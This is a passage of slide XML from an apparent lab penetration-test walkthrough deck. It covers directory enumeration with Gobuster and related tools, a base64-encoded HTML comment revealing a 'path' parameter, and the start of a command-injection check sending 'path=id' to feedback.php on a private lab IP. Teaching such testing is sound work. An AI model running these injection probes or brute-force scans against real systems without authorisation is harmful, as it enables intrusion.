          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4297680"/>
            <a:ext cx="5394960" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WHAT EACH TOOL DOES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4498848"/>
            <a:ext cx="5394960" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>curl = raw HTTP client, inspects requests/responses directly. WhatWeb = fingerprints frameworks/technologies. Gobuster = brute-forces hidden directories &amp; files against a wordlist.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1874520"/>
            <a:ext cx="5440680" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3137"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="2057400"/>
            <a:ext cx="4937760" cy="274320"/>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PATHS DISCOVERED</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="2377440"/>
            <a:ext cx="4937760" cy="1737360"/>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300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/root/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/root/images/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/root/images/os/  →  feedback.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/root/log_in/meaco/  →  login.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/root/log_in/admin/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="4343400"/>
            <a:ext cx="5440680" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="4498848"/>
            <a:ext cx="4937760" cy="274320"/>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HOW CONTENT DISCOVERY WORKS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="4800600"/>
            <a:ext cx="4937760" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Wordlist  →  request each candidate path  →  read the HTTP status code  →  a 200/301/403 (not 404) means something real exists there.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10</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03 · ENUMERATION</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Hidden Application Clue</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="11064240" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1508760"/>
            <a:ext cx="10735056" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ curl -i http://192.168.76.157/root/images/os/feedback.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2148840"/>
            <a:ext cx="11064240" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9412"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2331720"/>
            <a:ext cx="10515600" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>&lt;!-- P3BhdGg9 --&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3108960"/>
            <a:ext cx="5394960" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="3200400"/>
            <a:ext cx="5065776" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ echo 'P3BhdGg9' | base64 -d</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3108960"/>
            <a:ext cx="5440680" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11765"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="3108960"/>
            <a:ext cx="1097280" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Result: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7360920" y="3108960"/>
            <a:ext cx="4114800" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22C55E"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>?path=</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3977640"/>
            <a:ext cx="5394960" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WHAT IS BASE64?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4178808"/>
            <a:ext cx="5394960" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A text encoding that represents binary or plain data using 64 printable characters. It is NOT encryption — anyone can decode it instantly with one command.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3977640"/>
            <a:ext cx="5440680" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WHY DEVELOPERS ENCODE COMMENTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="4178808"/>
            <a:ext cx="5440680" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Sometimes to obscure a note casually, or to embed structured data without breaking HTML — but client-visible source (including comments) should never be assumed private.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5029200"/>
            <a:ext cx="11064240" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7273"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5148072"/>
            <a:ext cx="10515600" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>IMPORTANT DISTINCTION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5413248"/>
            <a:ext cx="10515600" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Base64 itself is NOT the vulnerability. It was purely an information-discovery clue that told us a “path” GET parameter exists somewhere in the app — the vulnerability comes next.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11</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04 · VULNERABILITY VALIDATION</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Command Injection Validation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="6263640" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1463040"/>
            <a:ext cx="5934456" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ curl -i "http://192.168.76.157/root/images/os/feedback.php?path=id"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
